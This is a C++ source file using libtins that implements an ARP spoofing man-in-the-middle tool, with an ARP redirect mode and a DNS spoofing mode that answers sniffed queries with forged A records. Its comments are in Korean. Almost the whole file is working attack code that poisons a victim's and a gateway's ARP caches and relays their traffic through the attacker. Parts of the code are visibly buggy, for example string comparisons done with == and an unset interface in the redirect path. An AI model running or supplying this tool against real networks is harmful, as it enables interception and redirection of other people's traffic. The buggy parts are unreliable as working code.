#include <iostream>
#include <stdexcept>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>
#include <tins/tins.h>

#define	ETHERTYPE_IP		0x0800
#define BroadCast           "FF:FF:FF:FF:FF"

using namespace Tins;
using namespace std;
using std::runtime_error;

char *dev;
int mode;
IPv4Address Attack,Victim,Gate;
EthernetII::address_type own_hw;
NetworkInterface iface;
NetworkInterface::Info info;
in_addr_t *Attacker_Hex_Ip, *Victim_Hex_Ip, *Gateway_Hex_IP;
EthernetII::address_type gw_hw, victim_hw; // hardware mac addr var
pthread_t ARP_Spoofig_Relay_handle,ARP_Redirect_Relay_handle;

void Call_Device(char **C_dev);
pcap_if_t *alldevs;
pcap_if_t *d;
int i=0;
char buf[65000];
char Select_device[10];
char errbuf[PCAP_ERRBUF_SIZE];




void *ARP_Spoofing_Relay(void*)
{
    PacketSender ARP_Spoofing_Relay_Sender;
    SnifferConfiguration config;
    config.set_immediate_mode(true);
    Sniffer sniffer(dev,config);

    while(1)
    {
        PDU *pkt = sniffer.next_packet();
        EthernetII *eth = pkt->find_pdu<EthernetII>();

        if(eth->payload_type() == ETHERTYPE_IP)
        {
            if(eth->dst_addr() == info.hw_addr)
            {
                if(eth->src_addr() == victim_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(gw_hw);
                    pkt->send(ARP_Spoofing_Relay_Sender,dev);
                }

                if(eth->src_addr() == gw_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(victim_hw);
                    pkt->send(ARP_Spoofing_Relay_Sender,dev);
                }
            }
        }     
    }
}

void arp_spoofing(NetworkInterface Interface_device, IPv4Address gw, IPv4Address victim, const NetworkInterface::Info& info)
{

    PacketSender sender;

    gw_hw = Utils::resolve_hwaddr(Interface_device, gw, sender); // gateway mac addr
    victim_hw = Utils::resolve_hwaddr(Interface_device, victim, sender); // victim mac addr

    system("clear");
    cout << "********** ARP Spoofing Start **********\n\n";
    cout << "Using gateway hw address: " << gw_hw << "\n";
    cout << "Using victim hw address:  " << victim_hw << "\n";
    cout << "Using own hw address:     " << info.hw_addr << "\n";


     /* 우리는 게이트웨이에 피해자가 외신 주소라고 말했지만,
          그리고 희생자에게 게이트 웨이가 hw 주소에 있음을 알림*/

    //ARP라는 객체를 만든다. ARP 요청 및 응답은 ARP :: make_arp_requ림est / reply 정적 멤버 함수를 사용하여 쉽게 구성 할 수 있음.
     // 타겟 아이피, 보내는 아이피, 타겟 하드웨어 주소, 보내는 하드웨어 주소.

    ARP gw_arp_spoof(gw, victim, gw_hw, info.hw_addr), //info.hw_addr My Mac addr
            victim_arp_spoof(victim, gw, victim_hw, info.hw_addr); // info.hw_addr My Mac addr

    gw_arp_spoof.opcode(ARP::REPLY); // gateway_arp_opcode -> REPLY
    victim_arp_spoof.opcode(ARP::REPLY); // victim_arp_opcode -> REPLY


     /* 게이트웨이와 피해자에게 보낼 패킷.
             * 우리는 hw 주소를 소스 주소로 포함시킴.
             * 이더넷 계층에서 패킷 손실 가능성을 피하기 위해
             * 모든 라우터에서 수행. */

    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp_spoof;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp_spoof;

    pthread_create(&ARP_Spoofig_Relay_handle,NULL,&ARP_Spoofing_Relay,NULL);

    while (true)
    {
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(3);

    }//while문으로 계속 감염만 시키고 Relay는 해주지않음. 감염 시켜주는 패킷은 1초마다 보낸다.
}


void *ARP_Redirect_Relay(void*)
{
    PacketSender ARP_Redirect_Relay_Sender;
    SnifferConfiguration config;
    config.set_immediate_mode(true);
    Sniffer sniffer(dev,config);

    while(1)
    {
        PDU *pkt = sniffer.next_packet();
        EthernetII *eth = pkt->find_pdu<EthernetII>();

        if(eth->payload_type() == ETHERTYPE_IP)
        {
            if(eth->dst_addr() == info.hw_addr)
            {
                if(eth->src_addr() == victim_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(gw_hw);
                    pkt->send(ARP_Redirect_Relay_Sender,dev);
                }

                if(eth->src_addr() == gw_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(victim_hw);
                    pkt->send(ARP_Redirect_Relay_Sender,dev);
                }
            }
        }
    }
}

void arp_redirect(NetworkInterface Interface_device, IPv4Address gw, IPv4Address victim, const NetworkInterface::Info& info)
{

    PacketSender sender;

    gw_hw = Utils::resolve_hwaddr(Interface_device, gw, sender); // gateway mac addr
    victim_hw = Utils::resolve_hwaddr(Interface_device, victim, sender); // victim mac addr

    system("clear");
    cout << "********** ARP Redirect Start **********\n\n";
    cout << "Using gateway hw address: " << gw_hw << "\n";
    cout << "Using victim hw address:  " << victim_hw << "\n";
    cout << "Using own hw address:     " << info.hw_addr << "\n";


    //1. 게이트웨이 맥주소와 공격자의 맥주소와 희생자 맥주소 얻어옴.


     /* 우리는 게이트웨이에 피해자가 외신 주소라고 말했지만,
          그리고 희생자에게 게이트 웨이가 hw 주소에 있음을 알림*/

    //ARP라는 객체를 만든다. ARP 요청 및 응답은 ARP :: make_arp_requ림est / reply 정적 멤버 함수를 사용하여 쉽게 구성 할 수 있음.
     // 타겟 아이피, 보내는 아이피, 타겟 하드웨어 주소, 보내는 하드웨어 주소.

    /**
          * \ brief 제공된 주소를 사용하여 ARP 오브젝트를 구성합니다.
          * \ param target_ip 대상 IP 주소입니다.
          * \ param sender_ip 보낸 사람의 IP 주소입니다.
          * \ param target_hw 대상 하드웨어 주소.
          * \ param sender_hw 보낸 사람 하드웨어 주소입니다.
          * /
         ARP (ipaddress_type target_ip = ipaddress_type (),
             ipaddress_type sender_ip = ipaddress_type (),

             const hwaddress_type & target_hw = hwaddress_type (),
             const hwaddress_type & sender_hw = hwaddress_type ());
    **/

    ARP gw_arp_redirect(gw, victim, gw_hw, info.hw_addr), //info.hw_addr My Mac addr
            victim_arp_redirect(victim, gw, victim_hw, info.hw_addr); // info.hw_addr My Mac addr

    gw_arp_redirect.opcode(ARP::REPLY); // gateway_arp_opcode -> REPLY
    victim_arp_redirect.opcode(ARP::REPLY); // victim_arp_opcode -> REPLY


     /* 게이트웨이와 피해자에게 보낼 패킷.
             * 우리는 hw 주소를 소스 주소로 포함시킴.
             * 이더넷 계층에서 패킷 손실 가능성을 피하기 위해
             * 모든 라우터에서 수행. */

    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp_redirect;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp_redirect;



    pthread_create(&ARP_Redirect_Relay_handle,NULL,&ARP_Redirect_Relay,NULL);

    while (true)
    {
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(3);

    }//while문으로 계속 감염만 시키고 Relay는 해주지않음. 감염 시켜주는 패킷은 1초마다 보낸다.
}

//http://blog.naver.com/dmsgk1559/220249300659


int main(int argc, char* argv[])
{
    //error argc
    if (argc != 5 && argc != 6)
    {
        cout << "Error!!\n";
        cout << "1. ARP Spoofing: ./[FileName] [Interface_Device] [Attacker IP] [Victim IP] [GateWay IP] [1]"<<endl;
        cout << "2. ARP Redirect: ./[FileName] [Interface_Device] [Attacker IP] [GateWay IP] [2]"<<endl;
        cout << "3. DNS Spoofing: ./[FileName] [Interface_Device] [Victim IP] [IP] [3]"<<endl;
        return 1; //argv 인자값이 오류일때.
    }
    //argv[0] = 파일 이름, argv[1] = 인터페이스 , argv[2] = Attacker IP, argv[3] = Victim IP, argv[4] = GateWay IP
    dev = argv[1]; // 인터페이스 장치 이름을 dev 변수에 저장.

    if(argc == 6) //ARP Spoofing
    {
        cout << "ARP Spoofing\n";

        try
        {
            Attack = argv[2];   // Attack 변수에 Attacker의 IP 초기화
            Victim = argv[3];   // Victim 변수에 Victim의 IP초기화
            Gate = argv[4];     // Gate 변수에 Gate의 IP 초기화
        }

        catch (...)
        {
            cout << "Invalid ip found...\n";
            return 2; // argv 인자값을 변수에 넣을때의 오류
        }

        try
        {
            iface = Gate; // 요청에 대한 게이트웨이가 될 인터페이스를 가져옵니다.
            info = iface.addresses(); // 내 하드웨어 주소를 info라는 NetworkInferface 구조체 변수에 넣는다.
        }

        catch (runtime_error& ex)
        {
            cout << ex.what() << endl;
            return 3;
        }

    ARP_Spoofing_Retry:
            try
            {
                arp_spoofing(iface, Gate, Victim, info);
            }

            catch (runtime_error& ex)
            {
                goto ARP_Spoofing_Retry;
            }
    }

    else if(argc == 5) // ARP Redirect or DNS Spoofig
    {
        if(argv[4] == "2")//ARP Redirect
        {

            cout << "ARP Redirect!!\n";

        ARP_Redirect_Retry:
                try
                {
                    arp_redirect(iface, Gate, Victim, info);
                }

                catch (runtime_error& ex)
                {
                    goto ARP_Redirect_Retry;
                }
        }

        if(argv[4] == "3")
        {

            PacketSender sender;

            if (pcap_findalldevs(&alldevs, errbuf) == -1)
                fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);

            for(d=alldevs;d;d=d->next)
                printf("%d. %s \n", ++i, d->name);

            if(i==0)
                printf("\nNo interfaces found! Make sure WinPcap is installed.\n");

            printf("\nSelect Device: ");
            scanf("%s",&Select_device);
            dev = Select_device;
            system("clear");

            // libtins

            SnifferConfiguration config;
            //SnifferConfiguration :: set_immediate_mode
            config.set_immediate_mode(true);
            config.set_promisc_mode(true);
            config.set_filter("udp and dst port 53"); //dst port 53
            Sniffer sniffer(dev,config);
            sender.default_interface(dev);

            while(Packet pkt = sniffer.next_packet())
            {
                EthernetII eth = pkt.pdu()->rfind_pdu<EthernetII>();
                IP ip = eth.rfind_pdu<IP>();
                UDP udp = ip.rfind_pdu<UDP>();
                DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

                EthernetII spoof_eth;
                IP spoof_ip;
                UDP spoof_udp;
                DNS spoof_dns;

                if (dns.type() == DNS::QUERY)
                {
                    for (const auto& query : dns.queries())
                    {
                        if (query.query_type() == DNS::A)
                        {
                            spoof_eth.dst_addr(eth.src_addr()); // spoof_eth.dst_addr --> Gate addr
                            spoof_eth.src_addr(eth.dst_addr()); //spoof_eth.src_addr --> My addr
                            spoof_eth.payload_type(eth.payload_type());

                            //cout<<hex<<spoof_eth.dst_addr()<<"\n";
                            //cout<<hex<<spoof_eth.src_addr()<<"\n";
                            //cout<<hex<<spoof_eth.payload_type()<<"\n";

                            spoof_ip = ip;

                            spoof_ip.src_addr(ip.dst_addr()); // spoof_ip.src_addr --> DNS server addr
                            spoof_ip.dst_addr(ip.src_addr()); // spoof_ip.dst_addr --> My addr
                            //spoof_ip.id(0);
                            //spoof_ip.ttl(64);

                            //cout<<hex<<spoof_ip.src_addr()<<"\n";
                            //cout<<hex<<spoof_ip.dst_addr()<<"\n";

                            spoof_udp = udp;

                            spoof_udp.sport(udp.dport()); // spoof_udp.sport --> 53
                            spoof_udp.dport(udp.sport()); // spoof_udp.dport --> My port

                            //cout<<spoof_udp.sport()<<"\n";
                            //cout<<spoof_udp.dport()<<"\n";

                            spoof_dns = dns;

                            spoof_dns.add_answer(DNS::Resource(query.dname(),argv[1],DNS::A,query.query_class(),777));

                            //cout<<spoof_dns.answers_count()<<"\n";
                           // cout<<query.dname()<<"\n";

                            if (spoof_dns.answers_count() > 0)
                            {
                                cout<<"[Domain Name]: "<<query.dname()<<"\n[Send to Proxy Server]: "<<"("<<argv[1]<<")"<<"\n\n";
                                spoof_dns.type(DNS::RESPONSE);

                                spoof_dns.recursion_available(1);

                                auto Spoof_Dns_Packet = EthernetII(spoof_eth.dst_addr(),spoof_eth.src_addr()) / IP(spoof_ip.dst_addr(),spoof_ip.src_addr()) / UDP(spoof_udp.dport(),spoof_udp.sport()) / spoof_dns;

                                sender.send(Spoof_Dns_Packet);
                            }
                        }
                    }
                }
            }
        }

    }



    else
    {
        cout << "Input Error!!!\n";
        return 4;
    }

}
